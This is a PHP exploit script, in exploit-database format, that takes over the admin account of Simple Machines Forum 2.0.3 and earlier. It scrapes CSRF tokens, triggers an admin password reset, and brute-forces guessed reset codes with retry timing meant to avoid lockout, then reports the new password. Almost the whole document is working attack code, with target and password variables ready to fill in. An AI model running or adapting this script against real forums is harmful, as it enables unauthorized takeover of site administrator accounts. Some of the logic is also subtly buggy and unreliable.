# Exploit Title: Simple Machines Forum <= 2.0.3 Admin Password Reset
# Date: 2/FEB/2013
# Exploit Author: raz0r
# Vendor Homepage: www.simplemachines.org
# Software Link: http://download.simplemachines.org/index.php?archive;version=71
# Version: 2.0.3
# Tested on: OSX, Windows, Linux

<?PHP

/*

Simple Machines Forum <= 2.0.3 Admin Password Reset

@jake_m_rogers @GlenChatfield

http://www.simplemachines.org/

This script will test an SMF instance for susceptibility to the attack outlined in raz0r's blog post.

http://raz0r.name/vulnerabilities/simple-machines-forum/

All credit goes to him, this is just a quick and (very) dirty PoC.

*/

$websiteURL = "http://www.site.org/forum/";
$adminUsername = "admin";
$newPassword = "lemonparty";
$cookieFile = "/tmp/cookie.txt";
$UID = "1";

// Nothing to see after here.

$csrfURL = "reminder/";
$userURL = "reminder/?sa=picktype";
$submitURL = "reminder/?sa=setpassword2";
$firstReq = curl_init($websiteURL . $csrfURL);
$secondReq = curl_init($websiteURL . $userURL);
$thirdReq = curl_init($websiteURL . $submitURL);
$wentBad = 0;
$tryNum = 0;

letshax:

$startTimer = (float) array_sum(explode(' ',microtime()));


curl_setopt($firstReq, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($firstReq, CURLOPT_USERAGENT,
"Mozilla/9000.0 (compatible; MSIE DA 6.0; Windows NT 5.1)");
curl_setopt($firstReq, CURLOPT_RETURNTRANSFER, true);
curl_setopt($firstReq, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($firstReq, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($firstReq, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($firstReq, CURLOPT_COOKIEFILE, $cookieFile);
//curl_setopt($firstReq, CURLOPT_VERBOSE, true);

$toSearch = curl_exec($firstReq);
preg_match_all("|<input\s+?type=\"hidden\"\s+?name=\"(.*?)\"\s+?value=\"(.*?)\"\s+?/>|", $toSearch, $fieldMatch, PREG_PATTERN_ORDER);

$csrfOne = $fieldMatch[1][2];
$csrfTwo = $fieldMatch[2][2];

$postFields = array('user' => urlencode($adminUsername), $csrfOne => urlencode($csrfTwo));

foreach($postFields as $key=>$value) { $fieldString .= '&'.$key.'='.$value; }
rtrim($fieldString, '&');
$fieldString = substr($fieldString, 1);

curl_setopt($secondReq, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($secondReq, CURLOPT_USERAGENT,
"Mozilla/9000.0 (compatible; MSIE DA 6.0; Windows NT 5.1)");
curl_setopt($secondReq, CURLOPT_RETURNTRANSFER, true);
curl_setopt($secondReq, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($secondReq, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($secondReq, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($secondReq, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($secondReq,CURLOPT_POST, count($postFields));
curl_setopt($secondReq,CURLOPT_POSTFIELDS, $fieldString);
//curl_setopt($secondReq, CURLOPT_VERBOSE, true);

 $adminSubmitted = curl_exec($secondReq);

 $checkSubmitted = strpos($adminSubmitted, "A mail has been sent");

if ($checkSubmitted === false && $wentBad < 5) {
    echo "Something went wrong and we were unable to request a password reset, retrying.";
    echo "\n\n";
    $wentBad += 1;
	goto letshax;
} elseif ($checkSubmitted === false && $wentBad == 5) {
	echo "Fifth error trying to request a password reset. Exiting";
	echo "\n\n";
	curl_close($firstReq);
    curl_close($secondReq);
    curl_close($thirdReq);
    exit(0);
} else {
	$wentBad = 0;
    echo "Email Sent";
    echo "\n\n";
}

$postFields = array('passwrd1' => urlencode($newPassword), 'passwrd2' => urlencode($newPassword), 'code' => '5136', 'u' => $UID, $csrfOne => urlencode($csrfTwo));

foreach($postFields as $key=>$value) { $fieldString .= '&'.$key.'='.$value; }
rtrim($fieldString, '&');
$fieldString = substr($fieldString, 1);

curl_setopt($thirdReq, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($thirdReq, CURLOPT_USERAGENT,
"Mozilla/9000.0 (compatible; MSIE DA 6.0; Windows NT 5.1)");
curl_setopt($thirdReq, CURLOPT_RETURNTRANSFER, true);
curl_setopt($thirdReq, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($thirdReq, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($thirdReq, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($thirdReq, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($thirdReq,CURLOPT_POST, count($postFields));
curl_setopt($thirdReq,CURLOPT_POSTFIELDS, $fieldString);


$firstSubmit = curl_exec($thirdReq);

$checkFirst = strpos($firstSubmit, "Password successfully set");
echo $checkFirst;

if($checkFirst != false){
	goto success;
}

$postFields = array('passwrd1' => urlencode($newPassword), 'passwrd2' => urlencode($newPassword), 'code' => '8301', 'u' => $UID, $csrfOne => urlencode($csrfTwo));

foreach($postFields as $key=>$value) { $fieldString .= '&'.$key.'='.$value; }
rtrim($fieldString, '&');
$fieldString = substr($fieldString, 1);

curl_setopt($thirdReq,CURLOPT_POST, count($postFields));
curl_setopt($thirdReq,CURLOPT_POSTFIELDS, $fieldString);

sleep(10);

$secondSubmit = curl_exec($thirdReq);
$checkSecond = strpos($secondSubmit, "Password successfully set");

if($checkFirst != false){
	goto success;
}

if ($totalTime != 0) {
    goto timechex;
}

$tryNum += 1; $fuckedUp = 0;

timechex:

$endTimer = (float) array_sum(explode(' ',microtime())); 
$totalTime = sprintf("%.4f", ($endTimer-$startTimer));

if ($totalTime < 10) {
    sleep(1);
    goto timechex;
} elseif ($totalTime > 10 && $totalTime < 20) {
    echo "Try number ".$tryNum.", repeating";
    echo "\n\n";
    $tryNum += 1;
    goto letshax;
} elseif ($totalTime > 20 && $fuckedUp < 1) {
	echo "Took longer than expected, one more attempt before script triggers the lockout threshold. Try number ".$tryNum.", repeating";
	echo "\n\n";
	$tryNum += 1; $fuckedUp += 1;
    goto letshax;
} else {
	echo "Lockout threshold exceeded";
	echo "\n\n";
    goto fucked;
}

success:

echo ("You should now be able to login with your new password: ".$newPassword."");
curl_close($firstReq);
curl_close($secondReq);
curl_close($thirdReq);
exit(0);

fucked:

echo ("Lockout will be triggered if another attempt is made too soon.");
curl_close($firstReq);
curl_close($secondReq);
curl_close($thirdReq);
exit(0);


?>